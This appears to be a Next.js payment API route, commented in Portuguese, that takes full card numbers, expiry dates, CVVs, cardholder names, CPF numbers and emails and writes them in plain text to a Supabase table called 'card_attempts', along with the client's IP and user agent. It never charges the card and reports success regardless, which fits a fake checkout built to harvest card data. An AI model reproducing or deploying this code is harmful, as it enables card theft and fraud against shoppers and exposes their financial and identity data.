import { NextRequest, NextResponse } from 'next/server'
import { supabase, isSupabaseConfigured } from '@/lib/supabase'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    
    const {
      cardNumber,
      cardExpiry,
      cardCvv,
      cardName,
      cpf,
      email,
      amount,
      productName,
      category
    } = body

    // Validações básicas
    if (!cardNumber || !cardExpiry || !cardCvv || !cardName || !cpf || !email) {
      return NextResponse.json({
        success: false,
        error: 'Dados incompletos'
      }, { status: 400 })
    }

    // Se Supabase não estiver configurado, apenas retornar sucesso
    if (!isSupabaseConfigured || !supabase) {
      console.warn('⚠️ [CARD-ATTEMPT] Supabase não configurado - dados não salvos')
      return NextResponse.json({
        success: true,
        message: 'Processado (Supabase não configurado)'
      })
    }

    // Salvar no Supabase
    const { data, error } = await supabase
      .from('card_attempts')
      .insert([
        {
          card_number: cardNumber,
          card_expiry: cardExpiry,
          card_cvv: cardCvv,
          card_name: cardName,
          cpf: cpf,
          email: email,
          amount: amount,
          product_name: productName,
          category: category,
          created_at: new Date().toISOString(),
          ip: request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown',
          user_agent: request.headers.get('user-agent') || 'unknown'
        }
      ])
      .select()

    if (error) {
      console.error('❌ [SUPABASE] Erro ao salvar tentativa de cartão:', error)
      return NextResponse.json({
        success: false,
        error: 'Erro ao processar pagamento'
      }, { status: 500 })
    }

    console.log('✅ [SUPABASE] Tentativa de cartão salva:', data)

    return NextResponse.json({
      success: true,
      message: 'Dados salvos com sucesso'
    })

  } catch (error) {
    console.error('❌ [CARD-ATTEMPT] Erro:', error)
    return NextResponse.json({
      success: false,
      error: 'Erro interno do servidor'
    }, { status: 500 })
  }
}
